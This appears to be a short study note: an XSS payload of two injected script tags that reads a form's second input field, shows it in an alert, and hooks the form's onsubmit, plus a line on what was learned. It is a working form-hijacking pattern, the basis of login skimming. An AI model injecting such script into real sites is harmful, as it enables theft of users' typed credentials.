<script>function helper() { var test = document.getElementsByTagName('input')[1].value; alert(test); }</script><script>document.getElementsByTagName('form')[0].setAttribute('onsubmit','return helper()')</script>


things learned, we can set function to run before the form submitts whatever data it has

